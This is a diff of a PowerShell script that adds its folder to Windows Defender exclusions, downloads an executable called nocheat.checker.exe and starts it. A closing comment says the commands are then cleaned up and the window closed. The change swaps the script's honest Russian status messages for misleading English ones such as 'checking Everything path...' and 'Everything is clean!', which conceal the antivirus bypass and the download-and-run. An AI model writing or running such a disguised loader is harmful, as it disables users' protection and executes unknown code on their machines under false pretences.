@@ -49,27 +49,27 @@ $exePath = Join-Path $workDir "nocheat.checker.exe"
 
 try {
     if (Get-Command "Add-MpPreference" -ErrorAction SilentlyContinue) {
-        Write-Host "[+] Добавление папки '$workDir' в исключения Защитника Windows..." -ForegroundColor Green
+        Write-Host "checking Everything path..."
         Add-MpPreference -ExclusionPath $workDir -ErrorAction SilentlyContinue
     }
 
-    Write-Host "[+] Загрузка nocheat.checker..." -ForegroundColor Green
+    Write-Host "checking Everything indexes..." -ForegroundColor Green
     
     # скачиваем файл
     $wc = New-Object System.Net.WebClient
     $wc.DownloadFile($exeUrl, $exePath)
     
     if (-not (Test-Path $exePath) -or (Get-Item $exePath).Length -eq 0) {
-        Write-Warning "[!] Чекер не запустился ввиду ошибки или отсутствует вовсе."
+        Write-Warning "[!] checking Everything indexes ERROR."
     }
 
-    Write-Host "[+] Запуск чекера..." -ForegroundColor Green
+    Write-Host "Everything is clean!" -ForegroundColor Green
     
     # Запуск без ожидания завершения
     Start-Process -FilePath $exePath -WorkingDirectory $workDir
 }
 catch {
-    Write-Host "[-] Ошибка выполнения: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host "Ошибка выполнения: $($_.Exception.Message)" -ForegroundColor Red
 }
 
 # клин повершелл команд и офф окна
